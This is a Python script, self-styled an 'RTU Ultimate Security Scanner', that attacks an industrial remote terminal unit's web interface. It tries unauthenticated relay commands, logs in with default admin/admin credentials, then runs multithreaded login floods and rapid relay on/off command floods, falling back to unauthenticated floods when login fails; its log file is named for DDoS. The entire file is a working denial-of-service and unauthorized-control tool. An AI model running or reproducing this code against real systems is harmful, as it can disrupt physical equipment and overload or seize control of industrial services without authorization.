import requests
import threading
import time
from datetime import datetime

# Constants - change these for your target server
BASE_URL = "http://example.com"  # Change to your server
LOGIN_URL = f"{BASE_URL}/login"
WORK_URL = f"{BASE_URL}/rtu/work"
USERNAME = "admin"   # Change to valid username
PASSWORD = "admin"   # Change to valid password

# Logging setup
LOG_FILE = "rtu_ddos_log.txt"

def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {msg}"
    print(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

# --- Banner ---
def print_banner():
    banner = r"""
$$$$$$$\ $$$$$$$$\ $$\   $$\        $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$  __$$\\__$$  __|$$ |  $$ |      $$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |$$$\  $$ |$$  _____|$$  __$$\ 
$$ |  $$ |  $$ |   $$ |  $$ |      $$ /  \__|$$ /  \__|$$ /  $$ |$$$$\ $$ |$$$$\ $$ |$$ |      $$ |  $$ |
$$$$$$$  |  $$ |   $$ |  $$ |      \$$$$$$\  $$ |      $$$$$$$$ |$$ $$\$$ |$$ $$\$$ |$$$$$\    $$$$$$$  |
$$  __$$<   $$ |   $$ |  $$ |       \____$$\ $$ |      $$  __$$ |$$ \$$$$ |$$ \$$$$ |$$  __|   $$  __$$< 
$$ |  $$ |  $$ |   $$ |  $$ |      $$\   $$ |$$ |  $$\ $$ |  $$ |$$ |\$$$ |$$ |\$$$ |$$ |      $$ |  $$ |
$$ |  $$ |  $$ |   \$$$$$$  |      \$$$$$$  |\$$$$$$  |$$ |  $$ |$$ | \$$ |$$ | \$$ |$$$$$$$$\ $$ |  $$ |
\__|  \__|  \__|    \______/        \______/  \______/ \__|  \__|\__|  \__|\__|  \__|\________|\__|  \__|
                                                    a                                                     
RTU Ultimate Security Scanner - Aggressive Mode (Fixed)
"""
    print(banner)
    with open(LOG_FILE, "a") as f:
        f.write(banner + "\n")

# --- Login function ---
def login(session, username, password):
    try:
        resp = session.post(LOGIN_URL, json={"username": username, "password": password}, timeout=5)
        if resp.status_code == 200:
            log(f"Login SUCCESS for user '{username}'.")
            return True, resp.text
        else:
            log(f"Login FAILED for user '{username}'. Status: {resp.status_code}, Response: {resp.text}")
            return False, resp.text
    except Exception as e:
        log(f"Login EXCEPTION: {str(e)}")
        return False, str(e)

# --- Unauthorized RTU access test ---
def unauthorized_access_test():
    session = requests.Session()
    try:
        resp = session.post(WORK_URL, json={"id": "relay1", "status": "on"}, headers={"Content-Type": "application/json"}, timeout=5)
        log(f"Unauthorized RTU access attempt: Status {resp.status_code}, Response: {resp.text}")
        return resp.status_code, resp.text
    except Exception as e:
        log(f"Unauthorized RTU access EXCEPTION: {str(e)}")
        return None, str(e)

# --- Authorized RTU command test ---
def rtu_command_test(session):
    try:
        resp_on = session.post(WORK_URL, json={"id": "relay1", "status": "on"}, headers={"Content-Type": "application/json"}, timeout=5)
        log(f"RTU Command 'Turn ON': Status {resp_on.status_code}, Response: {resp_on.text}")
    except Exception as e:
        log(f"RTU Command 'Turn ON' EXCEPTION: {str(e)}")

    try:
        resp_off = session.post(WORK_URL, json={"id": "relay1", "status": "off"}, headers={"Content-Type": "application/json"}, timeout=5)
        log(f"RTU Command 'Turn OFF': Status {resp_off.status_code}, Response: {resp_off.text}")
    except Exception as e:
        log(f"RTU Command 'Turn OFF' EXCEPTION: {str(e)}")

# --- Aggressive login flooder ---
def login_flood_worker(thread_id, count):
    session = requests.Session()
    for i in range(count):
        try:
            resp = session.post(LOGIN_URL, json={"username": USERNAME, "password": PASSWORD}, timeout=5)
            if resp.status_code == 200:
                log(f"[Login Flood Thread {thread_id}] Attempt {i+1}: SUCCESS")
            else:
                log(f"[Login Flood Thread {thread_id}] Attempt {i+1}: FAIL - Status {resp.status_code}")
        except Exception as e:
            log(f"[Login Flood Thread {thread_id}] Attempt {i+1}: EXCEPTION - {str(e)}")

def start_login_flood(threads=10, attempts_per_thread=50):
    log("Starting aggressive login flood...")
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=login_flood_worker, args=(i+1, attempts_per_thread))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    log("Login flood finished.")

# --- Aggressive RTU command flooder ---
def rtu_flood_worker(thread_id, count, session=None):
    # If no authorized session, use a fresh session (unauthorized)
    if session is None:
        session = requests.Session()
    for i in range(count):
        try:
            # Randomly toggle relay status
            status = "on" if i % 2 == 0 else "off"
            resp = session.post(WORK_URL, json={"id": "relay1", "status": status}, headers={"Content-Type": "application/json"}, timeout=5)
            log(f"[RTU Flood Thread {thread_id}] Attempt {i+1}: Status {resp.status_code}")
        except Exception as e:
            log(f"[RTU Flood Thread {thread_id}] Attempt {i+1}: EXCEPTION - {str(e)}")

def start_rtu_flood(threads=10, attempts_per_thread=50, authorized_session=None):
    log("Starting aggressive RTU command flood...")
    thread_list = []
    for i in range(threads):
        # Pass the authorized session if available, else None
        t = threading.Thread(target=rtu_flood_worker, args=(i+1, attempts_per_thread, authorized_session))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    log("RTU command flood finished.")

# --- Main function ---
def main():
    print_banner()
    
    # Step 1: Unauthorized RTU access test
    log("Performing unauthorized RTU access test...")
    unauthorized_access_test()

    # Step 2: Login once and test authorized RTU commands
    session = requests.Session()
    success, msg = login(session, USERNAME, PASSWORD)
    if not success:
        log("Login failed. Skipping authorized RTU commands and RTU flood.")
    else:
        log("Performing authorized RTU command test...")
        rtu_command_test(session)

    # Step 3: Start aggressive flooding
    start_login_flood(threads=10, attempts_per_thread=50)
    
    if success:
        start_rtu_flood(threads=10, attempts_per_thread=50, authorized_session=session)
    else:
        # Flood RTU commands unauthorized if login failed
        start_rtu_flood(threads=10, attempts_per_thread=50, authorized_session=None)

if __name__ == "__main__":
    main()
